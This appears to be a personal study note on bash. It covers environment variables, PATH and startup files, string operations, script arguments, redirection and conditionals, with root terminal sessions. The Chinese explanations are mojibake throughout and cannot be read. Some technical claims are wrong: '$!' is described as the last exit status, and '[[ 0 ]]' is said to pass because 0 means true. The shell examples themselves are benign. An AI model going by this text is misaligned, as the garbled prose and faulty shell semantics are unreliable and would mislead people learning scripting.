pts/0 00:00:00 -bash root 11415 11337 0 20:57 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# child_var='hello khaz' [root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var hello khaz [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var è®¾ç½®å…¨å±€å˜é‡ åˆ›å»ºå…¨å±€ç¯å¢ƒå˜é‡çš„æ–¹æ³•æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç„¶åå†æŠŠå®ƒå¯¼å‡ºåˆ°å…¨å±€ç¯å¢ƒä¸­ã€‚ export var_nameï¼šå¯¼å‡ºå­shellçš„å±€éƒ¨å˜é‡åˆ°å…¨å±€ç¯å¢ƒä¸­ï¼ˆä¸´æ—¶ä¿®æ”¹ï¼‰ [root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest PID TTY TIME CMD 11566 pts/1 00:00:00 bash 11585 pts/1 00:00:00 \\_ ps [root@izwz99bgx9y93dmv0mir0ez ~]# a='khaz' [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# export a [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a khaz æˆ‘å‘ç°åªèƒ½åœ¨ç™»å½•ç»ˆç«¯çš„é‚£ä¸ªshellä¸­exportï¼Œä¸èƒ½åœ¨å­shellä¸­exportï¼Ÿ å› ä¸ºexportçš„ä½œç”¨æ˜¯è®©å­shellå¯ä»¥ç»§æ‰¿çˆ¶shellå¯¼å‡ºè¿‡çš„å˜é‡ã€‚ å¹¶ä¸”å¦‚æœåœ¨å­shellä¸­ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°çˆ¶shellä¸­è¯¥å…¨å±€å˜é‡çš„å€¼ã€‚ åˆ é™¤ç¯å¢ƒå˜é‡ unset var_nameï¼šåˆ é™¤ç¯å¢ƒå˜é‡ [root@izwz99bgx9y93dmv0mir0ez ~]# a=1 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a 1 [root@izwz99bgx9y93dmv0mir0ez ~]# unset a [root@izwz99bgx9y93dmv0mir0ez ~]# echo $a è®¾ç½®PATHç¯å¢ƒå˜é‡ PATHç¯å¢ƒå˜é‡å®šä¹‰äº†ç”¨äºè¿›è¡Œå‘½ä»¤å’Œç¨‹åºæŸ¥æ‰¾çš„ç›®å½•ã€‚ ä¸‹é¢æ¼”ç¤ºäº†åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹ä½¿ç”¨è¯¥å‘½ä»¤ã€‚ åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå‘½ä»¤å†…å®¹ä¸ºè¾“å‡º'hello khaz'ï¼Œå¹¶å°†å…¶ç§»åŠ¨åˆ°å­˜æ”¾è‡ªå®šä¹‰å‘½ä»¤çš„ç›®å½•ä¸‹ [root@izwz99bgx9y93dmv0mir0ez ~]# vim hello #!/bin/bash echo 'hello khaz' :wq [root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd [root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/ å› ä¸ºä¸å‘½ä»¤ä¸åœ¨åŒä¸€è·¯å¾„ä¸‹ï¼Œæç¤ºæ‰¾ä¸åˆ°å‘½ä»¤ [root@izwz99bgx9y93dmv0mir0ez ~]# hello -bash: hello: command not found æŸ¥çœ‹å¹¶å¢åŠ PATHï¼ˆè·¯å¾„ä»¥ï¼šåˆ†éš”ï¼‰ [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin [root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/ [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/ å†æ¬¡è¾“å…¥å‘½ä»¤æˆåŠŸæ‰§è¡Œ [root@izwz99bgx9y93dmv0mir0ez ~]# hello hello khaz è¿™ç§æ–¹æ³•å¯¹PATHå˜é‡çš„ä¿®æ”¹åªèƒ½æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿã€‚ è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ– æŠŠæˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒå˜é‡æ”¾åœ¨shellçš„å¯åŠ¨æ–‡ä»¶/ç¯å¢ƒæ–‡ä»¶ä¸­ã€‚ æˆ–è€…å¼€æœºå¯åŠ¨é¡¹/etc/init.d/å’Œ/etc/profile.d/ å¯åŠ¨æ–‡ä»¶/ç¯å¢ƒæ–‡ä»¶ ç™»å…¥Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªbash shellæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹bashä¼šåœ¨å‡ ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾å‘½ä»¤ã€‚ è¿™äº›æ–‡ä»¶å«ä½œå¯åŠ¨æ–‡ä»¶æˆ–ç¯å¢ƒæ–‡ä»¶ã€‚ 5ä¸ªä¸åŒçš„å¯åŠ¨æ–‡ä»¶ ï± /etc/profile ï± $HOME/.bash_profile ï± $HOME/.bashrc ï± $HOME/.bash_login ï± $HOME/.profile /etc/profileæ–‡ä»¶ /etc/profileæ–‡ä»¶æ˜¯bash shellé»˜è®¤çš„çš„ä¸»å¯åŠ¨æ–‡ä»¶ã€‚ åªè¦ä½ ç™»å½•äº†Linuxç³»ç»Ÿï¼Œbashå°±ä¼šæ‰§è¡Œ/etc/profileå¯åŠ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile ..... ..... for i in /etc/profile.d/*.sh ; do if [ -r \"$i\" ]; then if [ \"${-#*i}\" != \"$-\" ]; then . \"$i\" else . \"$i\" >/dev/null fi fi done .... .... å…¶ä¸­çš„forè¯­å¥ä¸ºLinuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ªæ”¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºå¯åŠ¨æ–‡ä»¶çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œshellä¼šæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/ total 64 drwxr-xr-x. 2 root root 4096 Oct 15 2017 . drwxr-xr-x. 82 root root 4096 Sep 24 23:07 .. -rw-r--r--. 1 root root 123 Jul 31 2015 less.csh -rw-r--r--. 1 root root 121 Jul 31 2015 less.sh -rw-r--r-- 1 root root 105 Aug 2 2017 vim.csh -rw-r--r-- 1 root root 269 Aug 2 2017 vim.sh -rw-r--r--. 1 root root 164 Jan 28 2014 which2.csh -rw-r--r--. 1 root root 169 Jan 28 2014 which2.sh -rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh -rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh ..... ä¸éš¾å‘ç°ï¼Œæœ‰äº›æ–‡ä»¶ä¸ç³»ç»Ÿä¸­çš„ç‰¹å®šåº”ç”¨æœ‰å…³ã€‚ å¤§éƒ¨åˆ†åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸¤ä¸ªå¯åŠ¨æ–‡ä»¶ï¼šä¸€ä¸ªä¾›bash shellä½¿ç”¨ï¼ˆä½¿ç”¨.shæ‰©å±•åï¼‰ï¼Œä¸€ä¸ªä¾›c shellä½¿ç”¨ï¼ˆä½¿ç”¨.cshæ‰©å±•åï¼‰ã€‚ å…¶ä¸­lang.cshå’Œlang.shæ–‡ä»¶æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦é›†çš„ã€‚ $HOMEç›®å½•ä¸‹çš„å¯åŠ¨æ–‡ä»¶ è¿™äº›å¯åŠ¨æ–‡ä»¶éƒ½èµ·ç€åŒä¸€ä¸ªä½œç”¨ï¼šæä¾›ä¸€ä¸ªç”¨æˆ·ä¸“å±çš„å¯åŠ¨æ–‡ä»¶æ¥å®šä¹‰è¯¥ç”¨æˆ·æ‰€ç”¨åˆ°çš„ç¯ å¢ƒå˜é‡ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME . .. .bash_history .bash_logout .bash_profile .bashrc .cache cqhttp .cshrc H1ve my_cmd .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo .viminfo.tmp web [root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile # .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs PATH=$PATH:$HOME/bin export PATH è¿™é‡Œå…ˆä¼šåˆ¤æ–­.bashrcæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc # .bashrc # User specific aliases and functions alias rm='rm -i' alias cp='cp -i' alias mv='mv -i' # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc è¿™é‡Œå¯ä»¥è®¾ç½®åˆ«åï¼Œæ¯”å¦‚æˆ‘æ·»åŠ alias la='ls -a',é‡å¯shellå [root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc # .bashrc # User specific aliases and functions alias rm='rm -i' alias cp='cp -i' alias mv='mv -i' alias la='ls -a' # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc fi [root@izwz99bgx9y93dmv0mir0ez ~]# la . .. .bash_history .bash_logout .bash_profile .bashrc .cache cqhttp .cshrc H1ve my_cmd .pip .pki .pydistutils.cfg .ssh .tcshrc .viminfo .viminfo.tmp web PATH=$PATH:$HOME/binåˆ™åº”è¯¥æ˜¯ç™»å½•shellåè‡ªåŠ¨æ·»åŠ è·¯å¾„åˆ°PATHä¸­ ç¼–è¾‘ä¸ºPATH=$PATH:$HOME/bin:$HOME/my_cmd é‡å¯shellå/sourceç«‹å³ç”Ÿæ•ˆå [root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd [root@izwz99bgx9y93dmv0mir0ez ~]# hello hello khaz ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ source xxx ç¯å¢ƒå˜é‡ç‰¹æ€§ ç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§å°±æ˜¯ï¼Œå®ƒä»¬å¯ä½œä¸ºæ•°ç»„ä½¿ç”¨ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3) [root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary 1 [root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1] 1[1] [root@izwz99bgx9y93dmv0mir0ez ~]# echo ${arrary[1]} 2 åœ¨ä½¿ç”¨å˜é‡æ—¶æœ€å¥½å°†å˜é‡åç”¨{}æ‹¬èµ·æ¥ï¼Œå¦åˆ™å¯èƒ½ä¼šè§£æé”™è¯¯ã€‚ shellè„šæœ¬ç¼–å†™ åˆ›å»ºshellè„šæœ¬ åœ¨åˆ›å»ºshellè„šæœ¬æ–‡ä»¶æ—¶ï¼Œå¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„shellã€‚å…¶æ ¼å¼ä¸ºï¼š#!/bin/bash åœ¨é€šå¸¸çš„shellè„šæœ¬ä¸­ï¼Œäº•å·ï¼ˆ#ï¼‰ç”¨ä½œæ³¨é‡Šè¡Œã€‚shellå¹¶ä¸ä¼šå¤„ç†shellè„šæœ¬ä¸­çš„æ³¨é‡Šè¡Œã€‚ç„¶è€Œï¼Œ shellè„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæ˜¯ä¸ªä¾‹å¤–ï¼Œ#åé¢çš„æƒŠå¹å·ä¼šå‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬ã€‚ #!/bin/bash echo hello world è®¾ç½®æƒé™ sudo chmod +x file_name è¿è¡Œè„šæœ¬ shell è„šæœ¬æ–‡ä»¶å chmod +x è„šæœ¬æ–‡ä»¶å; è„šæœ¬æ–‡ä»¶å . è„šæœ¬æ–‡ä»¶å source è„šæœ¬æ–‡ä»¶å è„šæœ¬æ–‡ä»¶åå¦‚./name.sh å˜é‡ å®šä¹‰ä¸ä½¿ç”¨ å¦‚æœè¦ç”¨åˆ°å˜é‡ï¼Œä½¿ç”¨$ï¼› å¦‚æœè¦æ“ä½œå˜é‡ï¼Œä¸ä½¿ç”¨$ã€‚ è¿™æ¡è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–å°±æ˜¯ä½¿ç”¨printenvæ˜¾ç¤ºæŸä¸ªå˜é‡çš„å€¼ã€‚ ç”¨åˆ°å˜é‡ â†’ ç”¨åˆ°å˜é‡çš„å€¼ echo $a #è¾“å‡ºå˜é‡çš„å€¼ printenv PATH #ç”¨åˆ°å˜é‡çš„å€¼ï¼Œä½†ä¸éœ€è¦åŠ $ æ“ä½œå˜é‡ a=1 #å®šä¹‰å˜é‡ export a #å¯¼å‡ºå˜é‡ unset a #åˆ é™¤å˜é‡ ç‰¹æ€§ èƒ½å¤Ÿè®©å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•° [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root [root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME H1ve web [root@izwz99bgx9y93dmv0mir0ez ~]# ls /root H1ve web å†…æ•›æ‰§è¡Œ [root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls` [root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls) >>è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚ å…ˆæ‰§è¡Œçš„å‘½ä»¤æ˜¯ç”±å½“å‰shellåˆ›å»ºçš„å­shellæ‰§è¡Œçš„ã€‚ åŠ ä¸Š{}ç”¨äºåŒºåˆ†å˜é‡ [root@izwz99bgx9y93dmv0mir0ez ~]# a=b [root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab #å› ä¸ºæ‰¾ä¸åˆ°å˜é‡abï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©º [root@izwz99bgx9y93dmv0mir0ez ~]# echo ${a}b bb å­—ç¬¦ä¸² å½“å˜é‡å€¼å«æœ‰ç©ºæ ¼æ—¶ï¼Œå°±è¦åŠ ä¸Šå¼•å·ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# b= world -bash: world: command not found å•å¼•å·ï¼šä¸èƒ½è§£æå˜é‡ï¼Œåªä¼šåŸæ ·è¾“å‡º åŒå¼•å·ï¼šèƒ½å¤Ÿè§£æå˜é‡ è·å–å­—ç¬¦ä¸²é•¿åº¦ ${#string} â”Œâ”€â”€(khaz?kali)-[~] â””â”€$ str='hello khaz' â”Œâ”€â”€(khaz?kali)-[~] â””â”€$ echo ${#str} 10 åˆ‡ç‰‡ ${string:num1:num2} num1å¯ä»¥çœç•¥ï¼Œé»˜è®¤ä¸º0ï¼Œnum2å¿…é¡»æœ‰å€¼ï¼Œæ”¯æŒè´Ÿæ•° â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ str='hello khaz' â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ echo ${str::2} he â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ echo ${str::-1} hello kha æˆªå– str=\"www.runoob.com/linux/linux-shell-variable.html\" echo \"str : ${str}\" echo \"str#*/ : ${str#*/}\" # ä» å­—ç¬¦ä¸²å¼€å¤´ åˆ é™¤åˆ° å·¦æ•°ç¬¬ä¸€ä¸ª'/' echo \"str##*/ : ${str##*/}\" # ä» å­—ç¬¦ä¸²å¼€å¤´ åˆ é™¤åˆ° å·¦æ•°æœ€åä¸€ä¸ª'/' echo \"str%/* : ${str%/*}\" # ä» å­—ç¬¦ä¸²æœ«å°¾ åˆ é™¤åˆ° å³æ•°ç¬¬ä¸€ä¸ª'/' echo \"str%%/* : ${str%%/*}\" # ä» å­—ç¬¦ä¸²æœ«å°¾ åˆ é™¤åˆ° å³æ•°æœ€åä¸€ä¸ª'/' >> str : www.runoob.com/linux/linux-shell-variable.html str#*/ : linux/linux-shell-variable.html str##*/ : linux-shell-variable.html str%/* : www.runoob.com/linux str%%/* : www.runoob.com æ›¿æ¢ å•ä¸ª string=\"text, dummy, text, dummy\" echo ${string/text/TEXT} TEXT, dummy, text, dummy å…¨éƒ¨ string=\"text, dummy, text, dummy\" echo ${string//text/TEXT} TEXT, dummy, TEXT, dummy è„šæœ¬å‚æ•° #!/bin/bash echo \"Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼\"; echo '$0' :\"æ‰§è¡Œçš„æ–‡ä»¶å $0\"; echo '$1' :\"ç¬¬ä¸€ä¸ªå‚æ•°ä¸º $1\"; echo '$2' :\"ç¬¬äºŒä¸ªå‚æ•°ä¸º $2\"; echo '$3' :\"ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º $3\"; echo \"ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°ä¸º $#\"; echo '$*' \"ï¼š$*\"; echo '$@' \"ï¼š$@\"; echo '$$' :\"è„šæœ¬è¿›ç¨‹pid $$\"; echo \"ps :`ps`\"; echo '$!' :\"åå°æœ€åä¸€ä¸ªè¿›ç¨‹çš„pid $!\"; echo '$-' :\"æ˜¾ç¤ºshellå‚æ•° $-\"; echo '$?' :\"æ˜¾ç¤ºæœ€åä¸€ä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ $?\"; â”Œâ”€â”€(rootã‰¿kali)-[/home/khaz] â””â”€# ./shell.sh 1 2 3 Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼ $0 :æ‰§è¡Œçš„æ–‡ä»¶å ./shell.sh $1 :ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 1 $2 :ç¬¬äºŒä¸ªå‚æ•°ä¸º 2 $3 :ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º 3 ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°ä¸º 3 $* ï¼š1 2 3 $@ ï¼š1 2 3 $$ :è„šæœ¬è¿›ç¨‹pid 2702 ps : PID TTY TIME CMD 2276 pts/0 00:00:00 su 2277 pts/0 00:00:02 zsh 2702 pts/0 00:00:00 shell.sh 2703 pts/0 00:00:00 ps $! :åå°æœ€åä¸€ä¸ªè¿›ç¨‹çš„pid $- :æ˜¾ç¤ºshellå‚æ•° hB $? :æ˜¾ç¤ºæœ€åä¸€ä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ 0 é‡å®šå‘ https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/ å½“Linuxå¯åŠ¨çš„æ—¶å€™ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«æ˜¯ï¼š æ ‡å‡†è¾“å…¥standard input 0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰ æ ‡å‡†è¾“å‡ºstandard output 1ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰ é”™è¯¯è¾“å‡ºï¼šerror output 2ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰ æ³¨æ„ï¼š ï¼ˆ1ï¼‰ä»¥åå†æ‰“å¼€æ–‡ä»¶ï¼Œæè¿°ç¬¦å¯ä»¥ä¾æ¬¡å¢åŠ  ï¼ˆ2ï¼‰ä¸€æ¡shellå‘½ä»¤ï¼Œéƒ½ä¼šç»§æ‰¿å…¶çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤æ‰€æœ‰çš„shellå‘½ä»¤ï¼Œéƒ½ä¼šé»˜è®¤æœ‰ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ æ–‡ä»¶æ‰€æœ‰è¾“å…¥è¾“å‡ºéƒ½æ˜¯ç”±è¯¥è¿›ç¨‹æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶çš„ã€‚ï¼ˆLinuxä¸€åˆ‡çš†æ–‡ä»¶ï¼Œå°±è¿é”®ç›˜æ˜¾ç¤ºå™¨è®¾å¤‡éƒ½æ˜¯æ–‡ä»¶ï¼Œå› æ­¤ä»–ä»¬çš„è¾“å…¥è¾“å‡ºä¹Ÿæ˜¯ç”±æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶ï¼‰ é‡å®šå‘å°±æ˜¯é’ˆå¯¹æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œ é‡å®šå‘ç¬¦å·ä¸ªæ•° 1ä¸ªï¼šå†™å…¥å¹¶è¦†ç›– 2ä¸ªï¼šè¿½åŠ  è¾“å‡ºé‡å®šå‘ å°†å‘½ä»¤ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ä¸­ï¼Œå³å°†è¾“å‡ºæ–‡ä»¶ç¬¦1/2æŒ‡å‘æ–‡ä»¶ï¼Œé»˜è®¤ä¸º1ã€‚ æ ‡å‡†è¾“å‡ºé‡å®šå‘ > file [root@izwz99bgx9y93dmv0mir0ez study]# ls > file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘ 2> file [root@izwz99bgx9y93dmv0mir0ez study]# touch errorlog [root@izwz99bgx9y93dmv0mir0ez study]# afaaafa 2> errorlog [root@izwz99bgx9y93dmv0mir0ez study]# cat errorlog -bash: afaaafa: command not found æ ‡å‡†é”™è¯¯è¾“å‡ºå’Œæ ‡å‡†è¾“å‡ºé‡å®šå‘ &> file ï¼Œ>& fileï¼Œ >file 2>&1 æ­¤å¤„&>æˆ–è€…>&è§†ä½œæ•´ä½“ï¼ŒäºŒè€…æ˜¯ä¸€æ ·çš„ï¼Œåˆ†å¼€æ²¡æœ‰å•ç‹¬çš„å«ä¹‰ã€‚ & ç›®çš„æ˜¯ä¸ºäº†åŒºåˆ†æ•°å­—åå­—çš„æ–‡ä»¶å’Œæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰& ç³»ç»Ÿä¼šè®¤ä¸ºæ˜¯å°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘åˆ°äº†ä¸€ä¸ªæ•°å­—ä½œä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ [root@izwz99bgx9y93dmv0mir0ez study]# ls &> file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog [root@izwz99bgx9y93dmv0mir0ez study]# dasdasd &>> file [root@izwz99bgx9y93dmv0mir0ez study]# cat file errorlog file rightlog -bash: dasdasd: command not found æ³¨æ„ç‚¹ é¡ºåºä¸èƒ½æ›´æ”¹ cmd > file 2>&1 â†’ `cmd 2>&1 > file ç»“æœæ˜¯æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºä¸æ˜¯æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶ã€‚ è¾“å…¥é‡å®šå‘ æ ‡å‡†è¾“å…¥é‡å®šå‘ å°†æ–‡ä»¶å†…å®¹é‡å®šå‘åˆ°å‘½ä»¤ä¸­ï¼Œå³å°†æ ‡å‡†è¾“å…¥æ–‡ä»¶æè¿°ç¬¦0æŒ‡å‘æ–‡ä»¶ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# cat file /root [root@izwz99bgx9y93dmv0mir0ez ~]# ls å†…è”è¾“å…¥é‡å®šå‘ è¿™ç§æ–¹æ³•æ— éœ€ä½¿ç”¨æ–‡ä»¶è¿›è¡Œé‡å®šå‘ï¼Œåªéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šç”¨äºè¾“å…¥é‡å®šå‘çš„æ•°æ®å°±å¯ä»¥äº†ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# cat a heredoc> b heredoc> c heredoc> flag a b c æŒ‡å®šä¸€ä¸ªæ–‡æœ¬æ ‡è®°ï¼ˆä»»ä½•å­—ç¬¦ä¸²éƒ½å¯ä½œä¸ºæ–‡æœ¬æ ‡è®°ï¼Œæˆ‘è¿™é‡Œæ˜¯flagï¼‰ï¼Œæ¥åˆ’åˆ†è¾“å…¥æ•°æ®çš„å¼€å§‹å’Œç»“å°¾ã€‚ æ‰€ä»¥catçš„è¾“å‡ºä¸ºa,b,c /dev/nullæ–‡ä»¶ /dev/null æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå†™å…¥åˆ°å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼›å¦‚æœå°è¯•ä»è¯¥æ–‡ä»¶è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°ã€‚ä½†æ˜¯ /dev/null æ–‡ä»¶éå¸¸æœ‰ç”¨ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å®ƒï¼Œä¼šèµ·åˆ°\"ç¦æ­¢è¾“å‡º\"çš„æ•ˆæœã€‚ è¿ç®—ç¬¦ æ•°å­¦è¿ç®— expr â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ a=2 b=1 â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ echo `expr $a+$b` 2+1 â”Œâ”€â”€(khazã‰¿kali)-[~] â””â”€$ echo `expr $a + $b` 3 æ³¨æ„ï¼šå˜é‡å’Œè¿ç®—ç¬¦ä¹‹é—´è¦ç”¨ç©ºæ ¼éš”å¼€æ‰å¯ä»¥ã€‚è¿ç®—è¡¨è¾¾å¼è¦ç”¨åå¼•å·åŒ…å›´ã€‚ IFè¯­å¥ æ¡ä»¶è¡¨è¾¾å¼ æœ€å¥½ç”¨[[ ]]ï¼Œå¹¶æ³¨æ„é—´éš” if [[ condition1 ]] then command1 elif condition2 then command2 else commandN fi if condition1; then command1; elif condition2; then command2; else commandN;fi; éœ€è¦æ³¨æ„çš„æ˜¯åœ¨shellä¸­0è¡¨ç¤ºTrueï¼Œå…¶ä»–çš„è¡¨ç¤ºFalseï¼ˆå‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼‰ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ if [[ 0 ]] then echo 0 is true fi >>0 is true åœ¨bashå’Œunix shellä¸­ï¼Œè¿”å›å€¼é€šå¸¸ä¸æ˜¯å¸ƒå°”å€¼ã€‚å®ƒä»¬æ˜¯æ•´æ•°é€€å‡ºä»£ç ï¼Œç”¨æ¥åˆ¤æ–­ä»£ç æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚ å¦‚æœ0æ˜¯é”™è¯¯çš„ï¼Œé‚£ä¹ˆç¨‹åºåªèƒ½æ˜¾ç¤ºä¸€ç§é”™è¯¯ã€‚ å¦‚æœ0æ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆä»»ä½•éé›¶å€¼éƒ½æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨1-255ä¹‹é—´çš„ä»»ä½•æ•°å­—æ¥è¡¨ç¤ºé”™è¯¯ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æœ‰è®¸å¤šä¸åŒç±»å‹çš„é”™è¯¯ã€‚ ä¾‹å¦‚1æ˜¯ä¸€ä¸ªä¸€èˆ¬æ€§é”™è¯¯ï¼Œ126è¡¨ç¤ºæ–‡ä»¶æ— æ³•æ‰§è¡Œï¼Œ127è¡¨ç¤ºâ€œæ‰¾ä¸åˆ°å‘½ä»¤â€ï¼Œç­‰ç­‰ã€‚ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ ls 1.sh 2.sh ctf fpm.py sstilabs-master test.sh â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $! #$!ä¿å­˜æœ€åä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„é€€å‡ºçŠ¶æ€ç  0 FORè¯­å¥ bashä¸‹ for ((i=1;i #!/bin/bash echo \"-- \\$* æ¼”ç¤º ---\" for i in \"$*\"; do echo $i done echo \"-- \\$@ æ¼”ç¤º ---\" for i in \"$@\"; do echo $i done whileè¯­å¥ 